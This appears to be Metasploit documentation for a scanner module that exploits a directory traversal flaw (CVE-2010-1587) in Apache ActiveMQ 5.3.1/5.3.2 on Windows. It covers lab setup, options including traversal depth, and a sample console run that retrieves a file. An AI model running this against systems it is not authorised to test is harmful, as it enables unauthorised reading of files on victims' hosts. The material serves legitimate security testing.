## Vulnerable Application

This module exploits a directory traversal vulnerability in Apache ActiveMQ 5.3.1 and 5.3.2 on
Windows systems. The flaw exists in the Jetty ResourceHandler that ships with these versions,
allowing an unauthenticated attacker to read arbitrary files from the target host.

The vulnerability is tracked as [CVE-2010-1587](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1587).

### Setup

To test this module you need a Windows host running one of the affected versions:

1. Download [Apache ActiveMQ 5.3.1](http://archive.apache.org/dist/activemq/apache-activemq/5.3.1/) or 5.3.2.
2. Extract the archive and run `bin\activemq.bat` to start the broker.
3. The web console listens on port **8161** by default.

## Verification Steps

1. Start msfconsole
2. Do: `use auxiliary/scanner/http/apache_activemq_traversal`
3. Do: `set RHOSTS [target IP]`
4. Do: `set RPORT 8161`
5. Do: `run`
6. You should see the contents of the requested file saved as loot.

## Options

### FILEPATH

The path of the file to retrieve from the target system, relative to the drive root. The default
value is `/windows\\win.ini`. Backslashes must be used for path separators on Windows targets.

### DEPTH

The number of traversal sequences (`/\..`) to prepend to the request. The default is `4`. If the
file is not found, try increasing this value.

## Scenarios

### ActiveMQ 5.3.1 on Windows Server 2003 SP2

```
msf > use auxiliary/scanner/http/apache_activemq_traversal
msf auxiliary(scanner/http/apache_activemq_traversal) > set RHOSTS 192.168.1.100
RHOSTS => 192.168.1.100
msf auxiliary(scanner/http/apache_activemq_traversal) > set RPORT 8161
RPORT => 8161
msf auxiliary(scanner/http/apache_activemq_traversal) > run

[*] 192.168.1.100:8161 - Sending request...
[*] 192.168.1.100:8161 - File saved in: /root/.msf4/loot/20250319120000_default_192.168.1.100_apache.activemq_123456.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

